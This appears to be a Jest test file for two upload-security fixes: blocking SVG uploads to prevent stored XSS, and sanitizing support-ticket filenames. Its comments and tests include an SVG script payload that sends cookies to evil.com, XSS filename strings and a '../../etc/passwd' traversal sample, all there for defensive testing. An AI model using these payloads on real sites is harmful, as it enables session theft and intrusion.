/**
 * Upload Middleware - SVG XSS Prevention Tests (BUG#14)
 *
 * VULNERABILITY: uploadMiddleware.ts accepted "image/svg+xml" as a valid MIME
 * type.  SVG files are XML documents that can contain:
 *   <svg xmlns="http://www.w3.org/2000/svg">
 *     <script>document.cookie = 'stolen'; fetch('https://evil.com?c=' + document.cookie)</script>
 *   </svg>
 *
 * When the SVG is served from the same origin (e.g. /uploads/public/product.svg)
 * the browser parses and executes the embedded script → Stored XSS.
 * All users viewing the product/service page would be attacked.
 *
 * FIX: Remove "image/svg+xml" from ACCEPTED_MIME_TYPES and ".svg" from the
 * valid extensions list.  Legitimate product images never need SVG.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * Support Ticket Filename Sanitization Tests (BUG#15)
 *
 * VULNERABILITY: support-ticket.service.ts used file.originalname verbatim:
 *   filename: `${Date.now()}-${file.originalname}`
 *
 * An attacker could upload a file with originalname:
 *   - "<script>alert(1)</script>.pdf"  → stored in DB, rendered as XSS in UI
 *   - "../../etc/passwd"              → path traversal on local storage
 *   - A 2000-char name               → DB constraint violation / log spam
 *
 * FIX: Sanitize originalname — strip non-alphanumeric chars (except safe ones),
 * collapse consecutive dots, and cap length at 200 chars.
 */

// ─────────────────────────────────────────────────────────────────────────────
// BUG#14 — SVG XSS Prevention
// ─────────────────────────────────────────────────────────────────────────────

describe('Upload Middleware - SVG XSS Prevention (BUG#14)', () => {
  // Replicate the exact filter logic from uploadMiddleware.ts so tests are
  // independent of the module import (avoids multer/diskStorage side-effects)

  const ACCEPTED_MIME_TYPES = [
    'image/png',
    'image/jpeg',
    'image/jpg',
    'image/gif',
    'image/webp',
    'image/bmp',
    // image/svg+xml intentionally excluded (BUG#14 - Stored XSS via embedded script)
  ]

  const VALID_EXTENSIONS = ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.bmp']
  // .svg intentionally excluded

  function isAllowedMime(mimetype: string): boolean {
    return ACCEPTED_MIME_TYPES.includes(mimetype)
  }

  function isAllowedExtension(filename: string): boolean {
    const ext = filename.slice(filename.lastIndexOf('.')).toLowerCase()
    return VALID_EXTENSIONS.includes(ext)
  }

  // ── MIME type check ────────────────────────────────────────────────────────

  it('should reject SVG MIME type (primary XSS vector)', () => {
    // SCENARIO: Attacker uploads malicious SVG with embedded <script>
    // RULE: image/svg+xml must NOT be in the allowed list
    expect(isAllowedMime('image/svg+xml')).toBe(false)
  })

  it('should reject .svg extension (double-check bypass prevention)', () => {
    // RULE: even if MIME check were bypassed, extension check must also reject SVG
    expect(isAllowedExtension('malicious.svg')).toBe(false)
    expect(isAllowedExtension('PAYLOAD.SVG')).toBe(false)
  })

  it('should still allow safe raster image MIME types', () => {
    // REGRESSION: removing SVG must not break normal image uploads
    expect(isAllowedMime('image/png')).toBe(true)
    expect(isAllowedMime('image/jpeg')).toBe(true)
    expect(isAllowedMime('image/jpg')).toBe(true)
    expect(isAllowedMime('image/gif')).toBe(true)
    expect(isAllowedMime('image/webp')).toBe(true)
    expect(isAllowedMime('image/bmp')).toBe(true)
  })

  it('should still allow safe raster extensions', () => {
    expect(isAllowedExtension('photo.png')).toBe(true)
    expect(isAllowedExtension('banner.jpg')).toBe(true)
    expect(isAllowedExtension('icon.webp')).toBe(true)
  })

  it('should reject other dangerous file types that could be mislabelled', () => {
    // Belt-and-suspenders check for other dangerous types
    expect(isAllowedMime('text/html')).toBe(false)
    expect(isAllowedMime('application/javascript')).toBe(false)
    expect(isAllowedMime('application/x-php')).toBe(false)
  })

  it('should demonstrate WHY SVG is dangerous (document the XSS vector)', () => {
    // This test is documentation — shows what an attacker could upload
    const maliciousSvgContent = `<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://evil.com?c='+document.cookie)</script>
</svg>`

    // Prove it's valid XML that a browser would parse and execute
    expect(maliciousSvgContent).toContain('<script>')
    expect(maliciousSvgContent).toContain('document.cookie')

    // And that the MIME type for it was previously accepted (vulnerable state)
    const wasVulnerable = ['image/svg+xml'].includes('image/svg+xml') // old allowed list
    expect(wasVulnerable).toBe(true)

    // Fixed state: not in the allowed list anymore
    expect(isAllowedMime('image/svg+xml')).toBe(false)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// BUG#15 — Support Ticket Filename Sanitization
// ─────────────────────────────────────────────────────────────────────────────

describe('Support Ticket - Filename Sanitization (BUG#15)', () => {
  // Replicate the exact sanitization logic from support-ticket.service.ts
  function sanitizeFilename(originalname: string): string {
    return originalname
      .replace(/[^a-zA-Z0-9._\-\s]/g, '_') // strip special chars
      .replace(/\.{2,}/g, '.')              // collapse consecutive dots
      .trim()
      .substring(0, 200)                   // hard cap
  }

  // ── XSS via filename ──────────────────────────────────────────────────────

  it('should strip HTML/script tags from filename (prevents stored XSS in admin UI)', () => {
    // SCENARIO: Attacker uploads file named "<script>alert(1)</script>.pdf"
    // RULE: Rendered filename in admin UI must not contain script tags
    const malicious = '<script>alert(1)</script>.pdf'
    const safe = sanitizeFilename(malicious)

    expect(safe).not.toContain('<script>')
    expect(safe).not.toContain('</script>')
    expect(safe).toContain('.pdf') // extension preserved
  })

  it('should strip angle brackets and quotes (HTML injection)', () => {
    const filename = '"><img src=x onerror=alert(1)>.jpg'
    const safe = sanitizeFilename(filename)

    expect(safe).not.toContain('"')
    expect(safe).not.toContain('>')
    expect(safe).not.toContain('<')
  })

  // ── Path traversal ────────────────────────────────────────────────────────

  it('should neutralize path traversal sequences (../../)', () => {
    // SCENARIO: Filename designed to escape storage prefix
    const traversal = '../../etc/passwd'
    const safe = sanitizeFilename(traversal)

    // Consecutive dots collapsed
    expect(safe).not.toContain('..')
  })

  it('should collapse multiple consecutive dots', () => {
    expect(sanitizeFilename('file....pdf')).not.toContain('..')
    expect(sanitizeFilename('a...b...c.jpg')).not.toContain('..')
  })

  // ── Length cap ────────────────────────────────────────────────────────────

  it('should truncate filenames longer than 200 characters', () => {
    const long = 'a'.repeat(300) + '.pdf'
    const safe = sanitizeFilename(long)
    expect(safe.length).toBeLessThanOrEqual(200)
  })

  // ── Safe names unchanged ──────────────────────────────────────────────────

  it('should preserve normal safe filenames intact', () => {
    // REGRESSION: sanitization must not corrupt legitimate filenames
    expect(sanitizeFilename('invoice-2024.pdf')).toBe('invoice-2024.pdf')
    expect(sanitizeFilename('photo_product_01.jpg')).toBe('photo_product_01.jpg')
    expect(sanitizeFilename('Report Q1 2024.docx')).toBe('Report Q1 2024.docx')
  })

  it('should allow alphanumeric, dots, hyphens, underscores and spaces', () => {
    const filename = 'My Document - Version 1.0 (FINAL).pdf'
    const safe = sanitizeFilename(filename)
    // Parentheses are stripped; rest is preserved
    expect(safe).toContain('My Document - Version 1.0')
    expect(safe).toContain('.pdf')
    expect(safe).not.toContain('(')
    expect(safe).not.toContain(')')
  })
})
